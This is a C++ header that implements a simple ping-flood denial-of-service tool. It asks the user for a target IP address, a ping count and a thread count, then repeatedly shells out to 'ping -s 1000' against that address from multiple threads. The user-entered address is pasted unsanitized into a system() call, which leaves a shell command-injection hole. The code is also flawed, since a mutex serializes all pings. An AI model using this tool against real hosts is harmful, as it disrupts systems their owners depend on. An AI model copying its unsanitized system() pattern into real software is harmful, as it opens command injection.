#pragma once

#include <mutex>
#include <iostream>
#include <string>
#include <vector>
#include <thread>

std::mutex threadguard;

void DDos(const std::string &ipaddr, int pings) {
    std::string formed = "ping -s 1000 -c 1"  " " + ipaddr;

    for (int i = 0; i < pings; i++) {
        threadguard.lock();
        system(formed.c_str());
        threadguard.unlock();
    }
}

void ThreadHandler(int pings, const std::string &ipaddr, bool useThreads, const int amountofthreads) {
    if (useThreads) {
        std::vector<std::thread> t;

        for (int i = 0; i < amountofthreads; i++) {
            t.emplace_back(std::thread(DDos, ipaddr, pings));
        }

        for (auto &i : t) {
            i.join();
        }
    } else {
        for (int i = 0; i < pings; i++) {
            DDos(ipaddr, pings);
        }
    }
}

void DDosInit(bool self) {
    std::string ipaddr;
    int pings;
    char answer2;
    int threads;

    std::cout << "Enter IP Address: ";
    std::cin >> ipaddr;
    std::cout << "Enter number of pings: ";
    std::cin >> pings;
    std::cout << "Threads y/n: ";
    std::cin >> answer2;
    if (answer2 == 'y') {
        std::cout << "Enter number of threads: ";
        std::cin >> threads;
        ThreadHandler(pings, ipaddr, true, threads);
    } else {
        ThreadHandler(pings, ipaddr, false, 0);
    }
}
